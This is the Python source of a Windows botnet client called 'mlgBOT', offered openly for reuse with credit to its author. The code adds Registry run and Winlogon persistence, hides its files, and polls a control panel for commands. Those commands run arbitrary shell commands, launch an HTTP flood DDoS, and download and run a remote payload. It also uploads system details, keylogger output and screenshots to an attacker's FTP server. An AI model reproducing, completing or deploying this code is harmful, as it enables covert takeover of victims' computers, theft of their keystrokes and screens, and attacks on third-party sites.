# -*- coding: cp1252 -*-

# mlgBOT v 1.1 coded by S4mick 
# you can use the code as long as you credit me @s4mick - s4mick.blogspot.com - s4mick.com
#ADDED MSGBOX,SETCURSOR,LOCKSCREEN, and isadmin on SENDINFO
import os,urllib2,base64,ctypes
import socket, sys, os,time ,random,platform ,ftplib
import win32gui, win32ui, win32con, win32api


def httpflood():
    ip=cmd.replace("DDOS", "")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ip=ip.replace(" ","")
        print ip
        s.connect((ip, 80))  
        s.send("""GET /?="""+str(random.randrange(9999999))+""" HTTP/1.1\r\n
              Connection: Keep-Alive """)
        print """GET /"""+str(random.randrange(9999999))+""" HTTP/1.1\r\n
              Connection: Keep-Alive """

    except ValueError:
        print "Host seems down or some connection error trying again..."
sent="false" #send info 1 time on db
sent2="false" # send 1 time online then refresh with cmd
botName="mlgbot.exe"
panelUrl="http://yoursite.com/" #your control panel IP 
virusN="remote.exe" #your remote install .exe name
botN="mlgbot.exe" #your bot name
#************************#
#your ftp details so you can save screenshots and keylogs to your server
ftpserver="ftp.server.com"
ftpuser="username"
ftppass="password"
#************************#
os.popen('REG ADD "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "Userinit" /t REG_SZ /F /D """'+os.getcwd()+'\\mlgbot.exe"""')


os.popen('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Updateslive" /t REG_SZ /F /D """'+os.getcwd()+'\\mlgbot.exe"""')
os.popen('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Updates" /t REG_SZ /F /D """'+os.getcwd()+'\\mlgbot.exe"""') 
os.popen('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /V "Microsoft" /t REG_SZ /F /D """'+os.getcwd()+'\\mlgbot.exe"""')
os.popen('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices" /V "Microsoft" /t REG_SZ /F /D """'+os.getcwd()+'\\mlgbot.exe"""')
os.popen('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /V "Microsoft" /t REG_SZ /F /D """'+os.getcwd()+'\\mlgbot.exe"""')





f= open("data.txt","a")
f.write("")
f.close()
os.popen("attrib +h data.txt") #HIDE logs
os.popen("attrib +h "+botN) #HIDE bot




while True:
    cmdRqst=panelUrl+"cmd.php"   #ordine della botnet
    try:
         cmd=str(urllib2.urlopen(cmdRqst).read()) #apre il link e prende la richiesta
         print cmd
    except:
        print "error getting orders from site"
        cmd="WAIT 10"
        print cmd
        #TEMP CHANGES TILL RESTART
    if "MSGBOX" in cmd:  #MSGBOX ERRORMESSAGETOSHOW
        msgtext=cmd.replace("MSGBOX ","")
        ctypes.windll.user32.MessageBoxA(None, msgtext, 'Error', 0x10)
    if "SETCURSOR" in cmd:  #SETCURSOR300  --> 300x300
        pos=cmd.replace("SETCURSOR","")
        ctypes.windll.user32.SetCursorPos(pos,pos)
    if "LOCKSCREEN" in cmd:
        ctypes.windll.user32.LockWorkStation()
    if "CHANGE FTPSERVER" in cmd:
        ftpserver=cmd.replace("CHANGE FTPSERVER ","")
    if "CHANGE FTPUSER" in cmd:
        ftpuser=cmd.replace("CHANGE FTPUSER ","")
    if "CHANGE FTPASS" in cmd:
        ftpuser=cmd.replace("CHANGE FTPASS ","")
    if "CHANGE REMOTE" in cmd:
        virusN=cmd.replace("CHANGE REMOTE ","")
    if "CHANGE PANELURL" in cmd:
        panelUrl=cmd.replace("CHANGE PANELURL ","")

    if "EXEC" in cmd: #time to use the good old os.popen
        cleancmd=cmd.replace("EXEC ","")
        print cleancmd
        os.popen(cleancmd)
        time.sleep(25) 
        
    if "REFRESH" in cmd : #REFRESH LISTS BOTS ONLINE AND INFOS
        sent="false"
        sent2="false"
        link=panelUrl+"del.php?reset=a"
        urllib2.urlopen(link).read()
        print "DELETING LIST"
        
    if "BOTSONLINE" in cmd :
         print "logging"
         if sent2 == "false" :
            ipconfig=str(urllib2.urlopen(panelUrl+"myip.php").read())
            urlloggami=panelUrl+"online.php?ipconf="+base64.b64encode(ipconfig)
            urllib2.urlopen(urlloggami).read()
            sent2="true"
    if "DDOS" in cmd :   #DDOS FUNCTION LAYER 7 http ONLY NOW
        for i in range(1, 1000):  
            try: 
                httpflood()
                print i
            except:
                print "can't do it"
        
            #add more ddos types
    if "INSTALL" in cmd : #REMOTE INSTALL FUNCTION (hide file and exec) USE THIS TO HOOK KEYLOGGER.exe
        try:   
            ratlink=panelUrl+VirusN
            df = urllib2.urlopen(ratlink) #your site hosting the rat or whatever file u want to upload into victim
            output = open(VirusN,"wb")
            output.write(df.read()) 
            output.close()
            os.popen("attrib +h "+VirusN) #hide the file
            os.popen("start "+VirusN) #start the file
            #add to start up?
            #os.popen('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Updates" /t REG_SZ /F /D """'+os.getcwd()+'\\'+VirusN'+"""') WIN 8 workin

        except:
            print "error wait maybe wrong link or connection refused"
    if "SENDINFO" in cmd :  #BASE64ALL DATA
       if sent == "false" :
        try:
           ipconfig=str(urllib2.urlopen(panelUrl+"myip.php").read())
           sysinfo=platform.uname() #lista
           data =" "
           for words in sysinfo:
               data=data+" "+words
               
           getUrl=panelUrl+"send.php?ipconf="+base64.b64encode(ipconfig)+"&sys="+base64.b64encode(data+"ADMIN:"+ctypes.windll.shell32.IsUserAnAdmin())  #ordine della botnet
           urllib2.urlopen(getUrl).read() #apre il link e prende la richiesta
           sent="true"
        except:
            print "error sending info.. retrying"
    if "WAIT" in cmd :
         secondi=cmd.replace("WAIT", "") #Prendo l'ip da dossare
         print "waiting "+secondi+" seconds"
         time.sleep(float(secondi))
    if "GOTO30" in cmd : #OGNI MEZZORA
         url=cmd.replace("GOTO30 ", "") #Prendo l'ip da dossare
         print " VISITING http://"+url+"  EVERY 30 SEC"
         try :
             cmd=urllib2.urlopen("http://"+url).read() #apre il link
         except:
             print "error visiting url ...check site url must be www.example.com"
         time.sleep(30) #frequenza di visualizzazione
    if "GOTO60" in cmd : #OGNI ORA
        try:
             url=cmd.replace("GOTO60 ", "") #Prendo l'ip da dossare
             print "VISITING http://"+url+"  EVERY 60 SEC"
             cmd=urllib2.urlopen("http://"+url).read() #apre il link
        except:
             print "error visiting url ...check site url must be www.example.com"
        time.sleep(60) #frequenza di visualizzazione
    if "SENDLOGS" in cmd :  #SAVE THE LOGS FROM THE KEYLOGGER INTO THE FTP SERVER
         session = ftplib.FTP(ftpserver,ftpuser,ftppass)
         file = open('data.txt','rb')                  # file to send
         session.storbinary('STOR keylogs/data1337.txt', file)     # send the file
         file.close()                                    # close file and FTP
         session.quit()
         time.sleep(60*10) #aspetta 10 minuti
    if "SCREEN" in cmd : #there is also imagegrab or other alternatives but i use this   
        try:
            hwin = win32gui.GetDesktopWindow()
            width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
            height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
            left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
            top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
            hwindc = win32gui.GetWindowDC(hwin)
            srcdc = win32ui.CreateDCFromHandle(hwindc)
            memdc = srcdc.CreateCompatibleDC()
            bmp = win32ui.CreateBitmap()
            bmp.CreateCompatibleBitmap(srcdc, width, height)
            memdc.SelectObject(bmp)
            memdc.BitBlt((0, 0), (width, height), srcdc, (left, top), win32con.SRCCOPY)
            fn='screen'+str(random.randrange(99999))+'.bmp'
            bmp.SaveBitmapFile(memdc, fn)
            print "SCREENSHOTED"
            os.popen("attrib +h "+fn) #HIDE SCREEN SHOTS :)
            #ftp connect e send
            session = ftplib.FTP(ftpserver,ftpuser,ftppass)
            file = open(fn,'rb')                  # file to send
            session.storbinary('STOR '+fn, file)     # send the file
            file.close()                                    # close file and FTP
            session.quit()
            print "uploaded screen"
            os.popen("del "+fn) 
        except:
            print "Error uploading or screenshooting"







    time.sleep(5)





